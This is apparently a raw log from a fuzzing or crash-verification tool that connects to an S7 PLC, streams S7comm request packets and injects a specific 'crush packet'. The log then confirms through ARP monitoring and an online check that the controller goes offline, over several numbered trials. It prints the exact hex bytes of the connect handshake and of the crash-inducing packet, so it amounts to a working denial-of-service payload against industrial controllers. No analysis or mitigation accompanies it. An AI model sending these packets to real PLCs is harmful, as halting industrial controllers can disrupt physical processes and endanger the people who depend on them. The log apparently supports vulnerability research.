[2021-12-19 20:25:54,592] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ca00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:54,798] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cb00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:55,003] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cc00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:55,206] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cd00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:55,413] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ce00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:55,619] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cf00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:55,826] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d000000800080001120411440100ff090004001c0000
[2021-12-19 20:25:56,028] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d100000800080001120411440100ff090004001c0000
[2021-12-19 20:25:56,231] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d200000800080001120411440100ff090004001c0000
[2021-12-19 20:25:56,438] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d300000800080001120411440100ff090004001c0000
[2021-12-19 20:25:56,664] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d400000800080001120411440100ff090004001c0000
[2021-12-19 20:25:56,879] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d500000800080001120411440100ff090004001c0000
[2021-12-19 20:25:57,085] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d600000800080001120411440100ff090004001c0000
[2021-12-19 20:25:57,286] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d700000800080001120411440100ff090004001c0000
[2021-12-19 20:25:57,492] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d800000800080001120411440100ff090004001c0000
[2021-12-19 20:25:57,698] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d900000800080001120411440100ff090004001c0000
[2021-12-19 20:25:57,902] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000da00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:58,107] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000db00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:58,311] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000dc00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:58,515] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000dd00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:58,720] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000de00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:58,924] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000df00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:59,129] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e000000800080001120411440100ff090004001c0000
[2021-12-19 20:25:59,337] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e100000800080001120411440100ff090004001c0000
[2021-12-19 20:25:59,539] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e200000800080001120411440100ff090004001c0000
[2021-12-19 20:25:59,745] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e300000800080001120411440100ff090004001c0000
[2021-12-19 20:25:59,950] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e400000800080001120411440100ff090004001c0000
[2021-12-19 20:26:00,158] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e500000800080001120411440100ff090004001c0000
[2021-12-19 20:26:00,363] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e600000800080001120411440100ff090004001c0000
[2021-12-19 20:26:00,567] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e700000800080001120411440100ff090004001c0000
[2021-12-19 20:26:00,774] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e800000800080001120411440100ff090004001c0000
[2021-12-19 20:26:00,979] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e900000800080001120411440100ff090004001c0000
[2021-12-19 20:26:01,184] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ea00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:01,388] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000eb00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:01,595] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ec00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:01,796] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ed00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:02,004] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ee00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:02,209] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ef00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:02,224] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:26:02,410] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:26:14,474] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:26:14,475] [INFO] [vertifyPassiveARP.<module>] -> No: 3, sended packets 116 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:26:19,759] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:26:21,880] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000f00000080000f000000a000a00f0
[2021-12-19 20:26:21,882] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f08032030000f000000800000000f0000003000300f0
[2021-12-19 20:26:23,891] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:26:23,892] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 79
[2021-12-19 20:26:23,899] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f100000800080001120411440100ff090004001c0000
[2021-12-19 20:26:24,109] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f200000800080001120411440100ff090004001c0000
[2021-12-19 20:26:24,314] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f300000800080001120411440100ff090004001c0000
[2021-12-19 20:26:24,520] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f400000800080001120411440100ff090004001c0000
[2021-12-19 20:26:24,725] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f500000800080001120411440100ff090004001c0000
[2021-12-19 20:26:24,929] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f600000800080001120411440100ff090004001c0000
[2021-12-19 20:26:25,136] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f700000800080001120411440100ff090004001c0000
[2021-12-19 20:26:25,339] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f800000800080001120411440100ff090004001c0000
[2021-12-19 20:26:25,547] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f900000800080001120411440100ff090004001c0000
[2021-12-19 20:26:25,750] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fa00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:25,954] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fb00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:26,160] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fc00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:26,363] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fd00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:26,567] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fe00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:26,770] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ff00000800080001120411440100ff090004001c0000
[2021-12-19 20:26:26,975] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000001000800080001120411440100ff090004001c0000
[2021-12-19 20:26:27,180] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000101000800080001120411440100ff090004001c0000
[2021-12-19 20:26:27,382] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000201000800080001120411440100ff090004001c0000
[2021-12-19 20:26:27,587] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000301000800080001120411440100ff090004001c0000
[2021-12-19 20:26:27,792] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000401000800080001120411440100ff090004001c0000
[2021-12-19 20:26:27,996] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000501000800080001120411440100ff090004001c0000
[2021-12-19 20:26:28,200] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000601000800080001120411440100ff090004001c0000
[2021-12-19 20:26:28,406] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000701000800080001120411440100ff090004001c0000
[2021-12-19 20:26:28,611] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000801000800080001120411440100ff090004001c0000
[2021-12-19 20:26:28,818] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000901000800080001120411440100ff090004001c0000
[2021-12-19 20:26:29,023] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:29,228] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:29,432] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:29,647] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:29,850] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:30,054] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000f01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:30,268] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001001000800080001120411440100ff090004001c0000
[2021-12-19 20:26:30,472] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001101000800080001120411440100ff090004001c0000
[2021-12-19 20:26:30,678] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001201000800080001120411440100ff090004001c0000
[2021-12-19 20:26:30,880] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001301000800080001120411440100ff090004001c0000
[2021-12-19 20:26:31,084] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001401000800080001120411440100ff090004001c0000
[2021-12-19 20:26:31,290] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001501000800080001120411440100ff090004001c0000
[2021-12-19 20:26:31,507] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001601000800080001120411440100ff090004001c0000
[2021-12-19 20:26:31,713] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001701000800080001120411440100ff090004001c0000
[2021-12-19 20:26:31,916] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001801000800080001120411440100ff090004001c0000
[2021-12-19 20:26:32,123] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001901000800080001120411440100ff090004001c0000
[2021-12-19 20:26:32,329] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:32,546] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:32,749] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:32,955] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:33,171] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:33,388] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:33,606] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002001000800080001120411440100ff090004001c0000
[2021-12-19 20:26:33,810] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002101000800080001120411440100ff090004001c0000
[2021-12-19 20:26:34,016] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002201000800080001120411440100ff090004001c0000
[2021-12-19 20:26:34,222] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002301000800080001120411440100ff090004001c0000
[2021-12-19 20:26:34,438] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002401000800080001120411440100ff090004001c0000
[2021-12-19 20:26:34,644] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002501000800080001120411440100ff090004001c0000
[2021-12-19 20:26:34,849] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002601000800080001120411440100ff090004001c0000
[2021-12-19 20:26:35,055] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002701000800080001120411440100ff090004001c0000
[2021-12-19 20:26:35,258] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002801000800080001120411440100ff090004001c0000
[2021-12-19 20:26:35,463] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002901000800080001120411440100ff090004001c0000
[2021-12-19 20:26:35,669] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002a01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:35,872] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002b01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:36,078] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:36,282] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002d01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:36,499] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:36,704] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:36,912] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003001000800080001120411440100ff090004001c0000
[2021-12-19 20:26:37,115] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003101000800080001120411440100ff090004001c0000
[2021-12-19 20:26:37,322] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003201000800080001120411440100ff090004001c0000
[2021-12-19 20:26:37,538] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003301000800080001120411440100ff090004001c0000
[2021-12-19 20:26:37,741] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003401000800080001120411440100ff090004001c0000
[2021-12-19 20:26:37,945] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003501000800080001120411440100ff090004001c0000
[2021-12-19 20:26:38,150] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003601000800080001120411440100ff090004001c0000
[2021-12-19 20:26:38,355] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003701000800080001120411440100ff090004001c0000
[2021-12-19 20:26:38,560] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003801000800080001120411440100ff090004001c0000
[2021-12-19 20:26:38,765] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003901000800080001120411440100ff090004001c0000
[2021-12-19 20:26:38,970] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:39,176] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:39,379] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:39,583] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:39,789] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:39,997] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:40,531] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:26:40,533] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100004001000e00000401120a10010003000083000001
[2021-12-19 20:26:40,739] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004101000800080001120411440100ff090004001c0000
[2021-12-19 20:26:40,947] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004201000800080001120411440100ff090004001c0000
[2021-12-19 20:26:41,150] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004301000800080001120411440100ff090004001c0000
[2021-12-19 20:26:41,353] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004401000800080001120411440100ff090004001c0000
[2021-12-19 20:26:41,556] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004501000800080001120411440100ff090004001c0000
[2021-12-19 20:26:41,771] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004601000800080001120411440100ff090004001c0000
[2021-12-19 20:26:41,975] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004701000800080001120411440100ff090004001c0000
[2021-12-19 20:26:42,180] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004801000800080001120411440100ff090004001c0000
[2021-12-19 20:26:42,386] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004901000800080001120411440100ff090004001c0000
[2021-12-19 20:26:42,592] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:42,798] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:43,003] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:43,210] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:43,416] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:43,623] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004f01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:43,827] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005001000800080001120411440100ff090004001c0000
[2021-12-19 20:26:44,032] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005101000800080001120411440100ff090004001c0000
[2021-12-19 20:26:44,239] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005201000800080001120411440100ff090004001c0000
[2021-12-19 20:26:44,443] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005301000800080001120411440100ff090004001c0000
[2021-12-19 20:26:44,648] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005401000800080001120411440100ff090004001c0000
[2021-12-19 20:26:44,853] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005501000800080001120411440100ff090004001c0000
[2021-12-19 20:26:45,057] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005601000800080001120411440100ff090004001c0000
[2021-12-19 20:26:45,263] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005701000800080001120411440100ff090004001c0000
[2021-12-19 20:26:45,466] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005801000800080001120411440100ff090004001c0000
[2021-12-19 20:26:45,672] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005901000800080001120411440100ff090004001c0000
[2021-12-19 20:26:45,879] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005a01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:46,086] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005b01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:46,290] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005c01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:46,497] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005d01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:46,704] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005e01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:46,910] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005f01000800080001120411440100ff090004001c0000
[2021-12-19 20:26:47,116] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006001000800080001120411440100ff090004001c0000
[2021-12-19 20:26:47,321] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006101000800080001120411440100ff090004001c0000
[2021-12-19 20:26:47,524] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006201000800080001120411440100ff090004001c0000
[2021-12-19 20:26:47,727] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006301000800080001120411440100ff090004001c0000
[2021-12-19 20:26:47,931] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006401000800080001120411440100ff090004001c0000
[2021-12-19 20:26:48,135] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006501000800080001120411440100ff090004001c0000
[2021-12-19 20:26:48,340] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006601000800080001120411440100ff090004001c0000
[2021-12-19 20:26:48,548] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006701000800080001120411440100ff090004001c0000
[2021-12-19 20:26:48,722] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:26:48,754] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:27:00,801] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:27:00,801] [INFO] [vertifyPassiveARP.<module>] -> No: 4, sended packets 119 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:27:06,110] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:27:09,155] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000680100080000f000000a000a00f0
[2021-12-19 20:27:09,155] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300006801000800000000f0000003000300f0
[2021-12-19 20:27:11,164] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:27:11,164] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 1
[2021-12-19 20:27:11,172] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006901000800080001120411440100ff090004001c0000
[2021-12-19 20:27:11,661] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:27:11,662] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100006a01000e00000401120a10010003000083000001
[2021-12-19 20:27:11,877] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006b01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:12,082] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006c01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:12,286] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006d01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:12,491] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006e01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:12,696] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006f01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:12,902] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007001000800080001120411440100ff090004001c0000
[2021-12-19 20:27:13,107] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007101000800080001120411440100ff090004001c0000
[2021-12-19 20:27:13,311] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007201000800080001120411440100ff090004001c0000
[2021-12-19 20:27:13,514] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007301000800080001120411440100ff090004001c0000
[2021-12-19 20:27:13,722] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007401000800080001120411440100ff090004001c0000
[2021-12-19 20:27:13,929] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007501000800080001120411440100ff090004001c0000
[2021-12-19 20:27:14,133] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007601000800080001120411440100ff090004001c0000
[2021-12-19 20:27:14,340] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007701000800080001120411440100ff090004001c0000
[2021-12-19 20:27:14,545] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007801000800080001120411440100ff090004001c0000
[2021-12-19 20:27:14,750] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007901000800080001120411440100ff090004001c0000
[2021-12-19 20:27:14,956] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007a01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:15,162] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007b01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:15,367] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007c01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:15,572] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007d01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:15,777] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007e01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:15,981] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007f01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:16,197] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008001000800080001120411440100ff090004001c0000
[2021-12-19 20:27:16,402] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008101000800080001120411440100ff090004001c0000
[2021-12-19 20:27:16,609] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008201000800080001120411440100ff090004001c0000
[2021-12-19 20:27:16,814] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008301000800080001120411440100ff090004001c0000
[2021-12-19 20:27:17,018] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008401000800080001120411440100ff090004001c0000
[2021-12-19 20:27:17,224] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008501000800080001120411440100ff090004001c0000
[2021-12-19 20:27:17,427] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008601000800080001120411440100ff090004001c0000
[2021-12-19 20:27:17,635] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008701000800080001120411440100ff090004001c0000
[2021-12-19 20:27:17,727] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:27:17,837] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:27:29,872] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:27:29,873] [INFO] [vertifyPassiveARP.<module>] -> No: 5, sended packets 31 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:27:35,190] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:27:37,910] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000880100080000f000000a000a00f0
[2021-12-19 20:27:37,910] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300008801000800000000f0000003000300f0
[2021-12-19 20:27:39,922] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:27:39,922] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 23
[2021-12-19 20:27:39,925] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008901000800080001120411440100ff090004001c0000
[2021-12-19 20:27:40,142] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008a01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:40,346] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008b01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:40,550] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008c01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:40,756] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008d01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:40,960] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008e01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:41,175] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008f01000800080001120411440100ff090004001c0000
